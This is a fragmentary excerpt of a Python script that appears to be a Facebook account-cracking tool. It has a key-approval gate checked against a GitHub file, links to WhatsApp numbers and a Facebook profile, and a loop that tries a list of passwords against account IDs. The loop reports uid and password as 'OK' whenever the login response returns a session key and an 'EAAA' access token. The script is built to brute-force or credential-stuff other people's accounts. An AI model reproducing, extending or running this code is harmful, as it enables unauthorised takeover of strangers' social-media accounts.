...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/MRRAKIB-404/EIBT/blob/main/appro.txt"])
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK : https://www.facebook.com/Itz.RAKiB.Sakib.Take.love ")
...
def notice():
	...
	os.system("xdg-open https://wa.me/+9660531382117?app=fbl")
	runtxt("\033[0;97m Your Key >> %s%s"%(G,basesplit))
	runtxt("\033[0;97m Approval Neyar Jonno Whatsapp A key Dao ")
	os.system("xdg-open https://wa.me/+8801323478844?text=")
	subprocess.check_output(["am", "start", "https://wa.me/+9660531382117?text="])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/MRRAKIB-404/EIBT/blob/main/appro.txt').text
			if basesplit in plr:
				key = basesplit
...
───────────────────────────────────────────────────────× 
    """)
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/Itz.RAKiB.Sakib.Take.love"])
		print("───────────────────────────────────────────────────────× ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=RAKIB=OK=>] %s | %s\033[0;97m         "%(uid, pw))
